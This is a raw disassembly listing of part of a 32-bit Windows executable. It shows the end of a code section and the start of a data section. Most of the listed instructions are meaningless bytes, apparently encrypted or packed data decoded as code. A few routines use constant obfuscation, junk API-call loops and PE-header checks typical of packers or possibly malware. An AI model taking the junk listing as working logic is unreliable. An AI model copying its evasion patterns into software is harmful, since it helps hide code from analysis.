  411485:	jnp    0x411470
  411487:	and    eax,0x9938faa4
  41148c:	xor    ch,BYTE PTR [ecx+0x3c463666]
  411492:	enter  0xb717,0xae
  411496:	or     al,0x6e
  411498:	mov    ds:0x91376b97,al
  41149d:	xchg   BYTE PTR [ecx-0x700d146e],dl
  4114a3:	stos   DWORD PTR es:[edi],eax
  4114a4:	push   cs
  4114a5:	test   eax,0x8f5bde08
  4114aa:	rcl    DWORD PTR ds:0x158934b9,1
  4114b0:	sub    DWORD PTR [edx+0x48d8df6f],0x9281b146
  4114ba:	aad    0x47
  4114bc:	ror    DWORD PTR [edx-0x30e1a081],1
  4114c2:	and    eax,0x33e62da1
  4114c7:	out    dx,eax
  4114c8:	outs   dx,DWORD PTR ds:[esi]
  4114c9:	pop    ds
  4114ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114cb:	test   DWORD PTR [esi-0x7cad99f0],eax
  4114d1:	cmp    cl,BYTE PTR [eax-0x44]
  4114d4:	ficomp DWORD PTR [ebp-0x583af5bc]
  4114da:	icebp  
  4114db:	sub    ch,bl
  4114dd:	or     al,0x19
  4114df:	add    BYTE PTR [ecx+edx*4-0x1c],dl
  4114e3:	sbb    al,0x52
  4114e5:	dec    ebp
  4114e6:	xor    BYTE PTR [edi],0xcf
  4114e9:	pop    edx
  4114ea:	inc    edx
  4114eb:	mov    ah,0x97
  4114ed:	hlt    
  4114ee:	or     al,0x7
  4114f0:	fdiv   QWORD PTR [ebp+0x77]
  4114f3:	push   0x9c704e9b
  4114f8:	dec    esi
  4114f9:	add    eax,0x46bc8e7
  4114fe:	jmp    0x411561
  411500:	and    DWORD PTR [ebx-0x59e8c560],eax
  411506:	gs inc esi
  411508:	iret   
  411509:	sbb    dl,BYTE PTR [ecx*8+0x1e73f5cc]
  411510:	out    dx,eax
  411511:	mov    ?,WORD PTR [edi+0x643dc4c9]
  411517:	imul   edx,DWORD PTR [ebp-0x3439d56a],0x9fb38fb3
  411521:	pop    esi
  411522:	or     al,0xf9
  411524:	(bad)  
  411525:	shr    DWORD PTR [eax],cl
  411527:	in     eax,0x2b
  411529:	shr    BYTE PTR [edi],1
  41152b:	sbb    eax,DWORD PTR [edi+0xbc5263e]
  411531:	inc    edx
  411532:	mov    al,dl
  411534:	ret    
  411535:	pop    edx
  411536:	mov    DWORD PTR [esi+edx*1],esi
  411539:	(bad)  [edi]
  41153b:	fbstp  TBYTE PTR [edi+0x278bc172]
  411541:	mov    dl,0x80
  411543:	nop
  411544:	and    dh,BYTE PTR [eax]
  411546:	adc    ecx,edi
  411548:	test   eax,0x94d945ad
  41154d:	and    eax,0xb16ca4c1
  411552:	mov    al,0xb3
  411554:	and    eax,0xaffd9183
  411559:	xor    BYTE PTR [edx+0x1b],al
  41155c:	mov    edx,0xca3e3b1b
  411561:	xchg   edx,eax
  411562:	mov    bh,bh
  411564:	mov    edi,0x497c56c4
  411569:	je     0x411592
  41156b:	std    
  41156c:	and    BYTE PTR [ecx-0x27],bl
  41156f:	test   DWORD PTR [esi-0x7f24c89a],esp
  411575:	jns    0x4115f4
  411577:	aaa    
  411578:	out    0x68,al
  41157a:	aam    0x33
  41157c:	in     al,dx
  41157d:	jg     0x4115cc
  41157f:	mov    al,0x9b
  411581:	(bad)  
  411582:	pop    eax
  411583:	or     ah,dl
  411585:	add    BYTE PTR [ecx],bl
  411587:	cmp    esp,DWORD PTR [edi+0x74]
  41158a:	sub    esi,ebp
  41158c:	adc    DWORD PTR [eax+0x6c9e3bee],edx
  411592:	dec    eax
  411593:	in     al,dx
  411594:	test   ebp,ebx
  411596:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411597:	sar    BYTE PTR ds:0x94a3270d,0xbb
  41159e:	xchg   ecx,eax
  41159f:	lods   al,BYTE PTR ds:[esi]
  4115a0:	out    0xb2,al
  4115a2:	dec    esi
  4115a3:	in     eax,0xca
  4115a5:	hlt    
  4115a6:	fwait
  4115a7:	js     0x4115db
  4115a9:	lea    ebp,[eax]
  4115ab:	sbb    BYTE PTR [edx*8-0x7d2607c8],ch
  4115b2:	ins    DWORD PTR es:[edi],dx
  4115b3:	and    al,0x71
  4115b5:	and    BYTE PTR [ebx-0x3d],cl
  4115b8:	jnp    0x411582
  4115ba:	dec    ebx
  4115bb:	sti    
  4115bc:	or     DWORD PTR [ebp+0x28bec04a],ebx
  4115c2:	mov    edx,0x9fe6d27d
  4115c7:	iret   
  4115c8:	in     eax,0x6f
  4115ca:	push   esp
  4115cb:	fisttp WORD PTR ds:0x9084e4bc
  4115d1:	test   DWORD PTR [ebx+0x8558b26],eax
  4115d7:	xor    eax,ecx
  4115d9:	lea    eax,[eax+edx*1+0x32729b]
  4115e0:	mov    DWORD PTR [ebp+0x8],eax
  4115e3:	inc    DWORD PTR [ebp+0xc]
  4115e6:	jmp    0x410fe6
  4115eb:	mov    eax,DWORD PTR [ebp-0x10]
  4115ee:	xor    eax,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	push   ebx
  411619:	fs adc eax,ecx
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x4115fb
  411625:	adc    cl,BYTE PTR [ebp-0x7e]
  411628:	dec    ebp
  411629:	in     eax,dx
  41162a:	scas   al,BYTE PTR es:[edi]
  41162b:	xor    bh,BYTE PTR [eax+0x17188f1b]
  411631:	push   ebx
  411632:	sbb    BYTE PTR [ebp-0x5a],bl
  411635:	adc    eax,0xe5f70b50
  41163a:	cli    
  41163b:	stos   BYTE PTR es:[edi],al
  41163c:	mov    al,0x72
  41163e:	shl    DWORD PTR [ecx+0x7a47110f],cl
  411644:	push   esp
  411645:	loop   0x4115ea
  411647:	jne    0x411678
  411649:	cmc    
  41164a:	xchg   esp,eax
  41164b:	pop    edi
  41164c:	mov    esi,0xc88236ee
  411651:	aad    0x5a
  411653:	fwait
  411654:	jne    0x4115e6
  411656:	lock adc BYTE PTR [edx-0x8],ah
  41165a:	push   ebx
  41165b:	pop    ebx
  41165c:	aaa    
  41165d:	sbb    ebx,DWORD PTR [ecx]
  41165f:	cmc    
  411660:	shl    BYTE PTR ss:[edx+esi*8],0xc4
  411665:	jle    0x4116a4
  411667:	loope  0x41167f
  411669:	or     eax,0xa5d8a725
  41166e:	out    dx,eax
  41166f:	or     ebp,DWORD PTR [edx]
  411671:	outs   dx,DWORD PTR ds:[esi]
  411672:	shl    DWORD PTR [edx],0xf4
  411675:	jmp    FWORD PTR [ebp+esi*1-0x54]
  411679:	and    eax,0x51e2a410
  41167e:	sub    eax,0xb0bda42f
  411683:	adc    al,0x65
  411685:	fsubr  QWORD PTR [edi+0x35]
  411688:	mov    cl,0xa4
  41168a:	sub    edi,DWORD PTR [edi-0x45]
  41168d:	dec    ebp
  41168e:	idiv   DWORD PTR [edx]
  411690:	retf   0x7ffd
  411693:	std    
  411694:	leave  
  411695:	add    al,0xa0
  411697:	cwde   
  411698:	pop    esp
  411699:	sub    eax,0xdfea3ead
  41169e:	cmp    BYTE PTR [edi-0x15],al
  4116a1:	push   es
  4116a2:	test   ah,0x4b
  4116a5:	jno    0x41165e
  4116a7:	sbb    bl,BYTE PTR [edx]
  4116a9:	add    ecx,DWORD PTR [edx]
  4116ab:	cdq    
  4116ac:	stos   BYTE PTR es:[edi],al
  4116ad:	jns    0x411703
  4116af:	fistp  DWORD PTR [ecx]
  4116b1:	ds icebp 
  4116b3:	dec    ebp
  4116b4:	mul    dh
  4116b6:	sbb    cl,BYTE PTR [esi]
  4116b8:	arpl   WORD PTR [eax],di
  4116ba:	ja     0x41163f
  4116bc:	shl    DWORD PTR [edx+0x52b19d06],cl
  4116c2:	(bad)  
  4116c3:	std    
  4116c4:	pop    es
  4116c5:	adc    eax,0x2cb697f9
  4116ca:	jg     0x411703
  4116cc:	mov    ds:0xd97b85a6,eax
  4116d1:	fistp  DWORD PTR [esi+eax*2]
  4116d4:	xchg   edx,eax
  4116d5:	les    esi,FWORD PTR [esi-0x79]
  4116d8:	xchg   DWORD PTR [edi+eiz*4-0x5d],ecx
  4116dc:	mov    dh,0xe6
  4116de:	mov    es,eax
  4116e0:	mov    ds:0x8cf73a6a,al
  4116e5:	xchg   edi,eax
  4116e6:	lea    ebx,[ebx+0x5d]
  4116e9:	data16 gs icebp 
  4116ec:	pop    ds
  4116ed:	loopne 0x41171b
  4116ef:	bound  ecx,QWORD PTR [ebx+eax*2]
  4116f2:	mov    edx,0x6f7c63e4
  4116f7:	jg     0x41172c
  4116f9:	add    ah,BYTE PTR [ebx]
  4116fb:	mov    cl,0x22
  4116fd:	imul   edi,DWORD PTR [edi],0x80399283
  411703:	sbb    al,0xe3
  411705:	call   0x2227:0x61978139
  41170c:	hlt    
  41170d:	mov    eax,ds:0x16622751
  411712:	daa    
  411713:	mov    bh,0x1a
  411715:	mov    cl,0x8b
  411717:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411718:	call   0x64eb4759
  41171d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41171e:	ins    DWORD PTR es:[edi],dx
  41171f:	xor    al,0xe8
  411721:	or     al,BYTE PTR [ebp+0x2b]
  411724:	and    BYTE PTR [edi],ch
  411726:	call   0x63a5:0x43b78358
  41172d:	cld    
  41172e:	out    0x71,al
  411730:	inc    esi
  411731:	icebp  
  411732:	jecxz  0x411748
  411734:	sti    
  411735:	sub    al,0x97
  411737:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411738:	test   BYTE PTR [edi],cl
  41173a:	aas    
  41173b:	adc    al,BYTE PTR [eax]
  41173d:	dec    esi
  41173e:	or     eax,0xe7270467
  411743:	mov    ah,BYTE PTR [edx]
  411745:	jecxz  0x4117a7
  411747:	scas   eax,DWORD PTR es:[edi]
  411748:	les    ebx,FWORD PTR ds:0x54f69c13
  41174e:	shl    DWORD PTR [ebx+ebx*1+0x1b],1
  411752:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411753:	scas   al,BYTE PTR es:[edi]
  411754:	(bad)  
  411755:	and    ebp,DWORD PTR [ebp+0x79f6825c]
  41175b:	push   edi
  41175c:	add    esi,DWORD PTR [ebx+eiz*8]
  41175f:	pop    edi
  411760:	out    dx,eax
  411761:	dec    esp
  411762:	xchg   ch,cl
  411764:	mov    edx,0xcb0559a2
  411769:	add    BYTE PTR [esp+ecx*1+0x49825932],0x7f
  411771:	pop    ss
  411772:	cmp    al,0x5a
  411774:	test   ebp,ebp
  411776:	mov    cl,0xbf
  411778:	cli    
  411779:	jmp    0xda501daf
  41177e:	cmp    BYTE PTR ds:0xb0640cde,ch
  411784:	in     eax,dx
  411785:	pusha  
  411786:	and    eax,0x39a899b3
  41178b:	int    0xff
  41178d:	dec    eax
  41178e:	mov    dl,0x52
  411790:	leave  
  411791:	fidivr DWORD PTR [ebx+0x796c1617]
  411797:	lods   al,BYTE PTR ds:[esi]
  411798:	jg     0x4117c5
  41179a:	shl    BYTE PTR [esp+eiz*8],cl
  41179d:	xchg   esp,eax
  41179e:	pop    ds
  41179f:	pop    esi
  4117a0:	hlt    
  4117a1:	scas   al,BYTE PTR es:[edi]
  4117a2:	daa    
  4117a3:	leave  
  4117a4:	dec    esp
  4117a5:	cdq    
  4117a6:	adc    edi,DWORD PTR [esi+0x3]
  4117a9:	cmp    edx,DWORD PTR [edx]
  4117ab:	jns    0x41174e
  4117ad:	loopne 0x4117f7
  4117af:	and    BYTE PTR [eax-0x4f],dh
  4117b2:	sub    dl,BYTE PTR [eax-0x65]
  4117b5:	pop    edx
  4117b6:	std    
  4117b7:	mov    cl,cl
  4117b9:	inc    ebp
  4117ba:	(bad)  
  4117bb:	and    eax,0x7b666f59
  4117c0:	pop    ss
  4117c1:	aas    
  4117c2:	call   0x37af7b3
  4117c7:	mov    cl,0x32
  4117c9:	lods   eax,DWORD PTR ds:[esi]
  4117ca:	aad    0xae
  4117cc:	sar    BYTE PTR [ebp-0x38f7ba75],cl
  4117d2:	add    eax,0x433723
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x43367f2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43371f,0x433683
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43371f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43369b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43372b,0x0
  41182f:	mov    eax,ds:0x43372b
  411834:	inc    eax
  411835:	mov    ds:0x43372b,eax
  41183a:	cmp    DWORD PTR ds:0x43372b,0xb
  411841:	jne    0x411887
  411847:	push   0x43383c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43372b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43372b
  411899:	inc    eax
  41189a:	mov    ds:0x43372b,eax
  41189f:	cmp    DWORD PTR ds:0x43372b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	pop    eax
  4118e8:	add    eax,0x4e2c49d0
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x4118bd
  4118f4:	sub    bh,BYTE PTR [ebx]
  4118f6:	outs   dx,BYTE PTR ds:[esi]
  4118f7:	push   ebx
  4118f8:	repz ds xchg ebp,eax
  4118fb:	dec    dh
  4118fd:	mov    ah,0x5e
  4118ff:	mov    ds:0xe276d7d6,eax
  411904:	icebp  
  411905:	aam    0x66
  411907:	add    DWORD PTR [ebx],ebx
  411909:	daa    
  41190a:	add    BYTE PTR [ebx+eiz*8+0x7ed4f9c8],0x40
  411912:	jg     0x41194c
  411914:	shr    BYTE PTR [edx-0x37],cl
  411917:	push   edx
  411918:	and    al,0x57
  41191a:	retf   
  41191b:	ja     0x411982
  41191d:	cmp    cl,BYTE PTR [eax-0x12]
  411920:	retf   
  411921:	out    0xad,eax
  411923:	fucom  st(3)
  411925:	sub    dl,bh
  411927:	jmp    ebx
  411929:	repz add DWORD PTR [esp+esi*4],0x3a
  41192e:	xchg   esi,eax
  41192f:	xchg   esp,eax
  411930:	xor    eax,0x5a74324
  411935:	adc    BYTE PTR [eax],bl
  411937:	add    esi,0xffffffcc
  41193a:	dec    ebp
  41193b:	pop    es
  41193c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193d:	fdiv   DWORD PTR [ecx]
  41193f:	outs   dx,BYTE PTR ds:[esi]
  411940:	es xchg edx,eax
  411942:	push   esi
  411943:	push   ss
  411944:	inc    ebp
  411945:	adc    ebx,DWORD PTR [esi+0x4f24e6d1]
  41194b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41194d:	outs   dx,DWORD PTR ds:[esi]
  41194e:	push   ds
  41194f:	inc    ebp
  411950:	xchg   ebx,eax
  411951:	jecxz  0x411965
  411953:	stos   DWORD PTR es:[edi],eax
  411954:	cli    
  411955:	or     BYTE PTR [ebp+0x5cbe96f],0x74
  41195c:	mov    ?,WORD PTR [edx+0x6f8f1085]
  411962:	inc    edx
  411963:	and    eax,0x6b86f2d6
  411968:	add    dl,BYTE PTR [ecx-0x4f5c30c0]
  41196e:	repz fisubr DWORD PTR [ebx+0x19]
  411972:	adc    al,0x90
  411974:	hlt    
  411975:	or     eax,0x1eac5735
  41197a:	jge    0x4119ed
  41197c:	lock xor eax,0x4bc4e61a
  411982:	sti    
  411983:	jae    0x411954
  411985:	xchg   ebp,eax
  411986:	(bad)  
  411987:	int3   
  411988:	and    BYTE PTR [ebp-0x4f],al
  41198b:	inc    ebx
  41198c:	jg     0x41198e
  41198e:	aam    0xaf
  411990:	pop    es
  411991:	and    DWORD PTR [ebx+eax*2+0x70],eax
  411995:	rcl    BYTE PTR [eax-0x446a8d9f],0xa5
  41199c:	lock jmp 0xcb4ca508
  4119a2:	push   edi
  4119a3:	pushf  
  4119a4:	push   es
  4119a5:	mov    ds:0x1752d078,eax
  4119aa:	jmp    0xdaa257e1
  4119af:	inc    ebx
  4119b0:	test   DWORD PTR [esi+0x6],edi
  4119b3:	rol    dl,1
  4119b5:	fldenv [ebx]
  4119b7:	mov    dh,0x20
  4119b9:	jp     0x411997
  4119bb:	or     eax,DWORD PTR [esp+ebx*4+0xe]
  4119bf:	jne    0x411971
  4119c1:	push   ebx
  4119c2:	or     al,0xff
  4119c4:	pop    ecx
  4119c5:	mov    al,0x67
  4119c7:	push   eax
  4119c8:	sar    dh,1
  4119ca:	stos   DWORD PTR es:[edi],eax
  4119cb:	dec    ecx
  4119cc:	xchg   edi,eax
  4119cd:	hlt    
  4119ce:	mov    dh,0xd1
  4119d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119d1:	sbb    ah,bl
  4119d3:	sti    
  4119d4:	cmp    al,ah
  4119d6:	mov    ds:0xa049b84d,al
  4119db:	in     al,dx
  4119dc:	jbe    0x4119cd
  4119de:	iret   
  4119df:	popa   
  4119e0:	jae    0x4119ba
  4119e2:	mov    WORD PTR [ecx],fs
  4119e4:	call   0xbad2fd14
  4119e9:	push   ebp
  4119ea:	sub    al,0xee
  4119ec:	cld    
  4119ed:	mov    WORD PTR [edx],ss
  4119ef:	into   
  4119f0:	or     edi,ecx
  4119f2:	stos   BYTE PTR es:[edi],al
  4119f3:	fdivr  QWORD PTR [edi]
  4119f5:	sbb    DWORD PTR [edi-0x79],esi
  4119f8:	and    eax,0x9f9845e0
  4119fd:	xor    eax,0xfefdd28c
  411a02:	daa    
  411a03:	adc    DWORD PTR [esi],esi
  411a05:	inc    edi
  411a06:	mov    ebx,0xf24e3133
  411a0b:	push   edi
  411a0c:	dec    esp
  411a0d:	div    BYTE PTR [edx]
  411a0f:	sub    al,0x56
  411a11:	ins    DWORD PTR es:[edi],dx
  411a12:	push   ebx
  411a13:	inc    edi
  411a14:	push   ebp
  411a15:	cwde   
  411a16:	or     esi,ecx
  411a18:	dec    edi
  411a19:	jmp    0x4b316872
  411a1e:	mov    DWORD PTR [ebx-0x63d3e7a3],edi
  411a24:	mov    ah,0x3c
  411a26:	adc    bl,BYTE PTR [ebp-0x795c4cac]
  411a2c:	in     al,0xc2
  411a2e:	push   eax
  411a2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a30:	sar    DWORD PTR [esi],0xad
  411a33:	pop    ebp
  411a34:	dec    ebx
  411a35:	iret   
  411a36:	in     eax,0x73
  411a38:	push   ecx
  411a39:	(bad)  
  411a3b:	lock fisubr DWORD PTR [ecx]
  411a3e:	mov    ah,0x95
  411a40:	jge    0x411a0a
  411a42:	cmp    esi,edx
  411a44:	push   es
  411a45:	jns    0x411aac
  411a47:	lea    ecx,[ebx-0x52f56c2b]
  411a4d:	sbb    DWORD PTR [edi],esi
  411a4f:	pop    ebx
  411a50:	jae    0x411a44
  411a52:	(bad)  
  411a53:	or     al,dl
  411a55:	mov    eax,ds:0x3037c139
  411a5a:	scas   al,BYTE PTR es:[edi]
  411a5b:	cli    
  411a5c:	adc    al,0x38
  411a5e:	mov    dl,0x88
  411a60:	das    
  411a61:	scas   al,BYTE PTR es:[edi]
  411a62:	cmp    al,0x39
  411a64:	xor    ebp,DWORD PTR [esi]
  411a66:	mov    cl,0xc4
  411a68:	cdq    
  411a69:	sub    ch,BYTE PTR [esi+0x67702187]
  411a6f:	inc    esi
  411a70:	ja     0x411a99
  411a72:	shl    BYTE PTR [ebp-0x51],1
  411a75:	add    BYTE PTR [edi-0x1693f16d],bl
  411a7b:	fstp   TBYTE PTR [edi]
  411a7d:	call   0x3d618431
  411a82:	adc    BYTE PTR [ebp+0x3cf1e598],0xbb
  411a89:	lock and DWORD PTR [ebx],0x7f5b645c
  411a90:	push   edx
  411a91:	dec    ebx
  411a92:	loopne 0x411aa2
  411a94:	or     al,0xac
  411a96:	in     eax,0x74
  411a98:	jecxz  0x411b12
  411a9a:	lods   eax,DWORD PTR ds:[esi]
  411a9b:	int3   
  411a9c:	sti    
  411a9d:	add    eax,ecx
  411a9f:	jmp    0x411ab1
  411aa4:	mov    eax,DWORD PTR [ebp-0x4]
  411aa7:	xor    eax,0x7510854
  411aac:	add    eax,0x32729b
  411ab1:	leave  
  411ab2:	ret    0x4

Disassembly of section .data:

00412000 <.data>:
  412000:	sub    al,0x29
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    DWORD PTR ss:[ecx],eax
  412007:	add    BYTE PTR [eax+0x29],al
  41200a:	add    DWORD PTR [eax],eax
  41200c:	dec    esi
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [eax+0x29],bl
  412012:	add    DWORD PTR [eax],eax
  412014:	bound  ebp,QWORD PTR [ecx]
  412016:	add    DWORD PTR [eax],eax
  412018:	ins    BYTE PTR es:[edi],dx
  412019:	sub    DWORD PTR [ecx],eax
  41201b:	add    BYTE PTR [esi+0x29],dh
  41201e:	add    DWORD PTR [eax],eax
  412020:	mov    BYTE PTR [ecx],ch
  412022:	add    DWORD PTR [eax],eax
  412024:	xchg   edx,eax
  412025:	sub    DWORD PTR [ecx],eax
  412027:	add    BYTE PTR [edx-0x5dfffed7],bl
  41202d:	sub    DWORD PTR [ecx],eax
  41202f:	add    BYTE PTR [esi-0x43fffed7],ch
  412035:	sub    DWORD PTR [ecx],eax
  412037:	add    dh,al
  412039:	sub    DWORD PTR [ecx],eax
  41203b:	add    dl,dl
  41203d:	sub    DWORD PTR [ecx],eax
  41203f:	add    ah,bl
  412041:	sub    DWORD PTR [ecx],eax
  412043:	add    ah,ch
  412045:	sub    DWORD PTR [ecx],eax
  412047:	add    ah,dh
  412049:	sub    DWORD PTR [ecx],eax
  41204b:	add    ah,bh
  41204d:	sub    DWORD PTR [ecx],eax
  41204f:	add    BYTE PTR [esi],al
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx],dl
  412055:	sub    al,BYTE PTR [ecx]
  412057:	add    BYTE PTR [esi],bl
  412059:	sub    al,BYTE PTR [ecx]
  41205b:	add    BYTE PTR [edx+ebp*1],ch
  41205e:	add    DWORD PTR [eax],eax
  412060:	sub    al,BYTE PTR ss:[ecx]
  412063:	add    BYTE PTR [edx+0x2a],al
  412066:	add    DWORD PTR [eax],eax
  412068:	dec    esp
  412069:	sub    al,BYTE PTR [ecx]
  41206b:	add    BYTE PTR [esi+0x2a],dl
  41206e:	add    DWORD PTR [eax],eax
  412070:	sub    al,BYTE PTR fs:[ecx]
  412073:	add    BYTE PTR [eax+0x2a],dh
  412076:	add    DWORD PTR [eax],eax
  412078:	js     0x4120a4
  41207a:	add    DWORD PTR [eax],eax
  41207c:	xchg   BYTE PTR [edx],ch
  41207e:	add    DWORD PTR [eax],eax
  412080:	nop
  412081:	sub    al,BYTE PTR [ecx]
  412083:	add    BYTE PTR [eax-0x5dfffed6],bl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
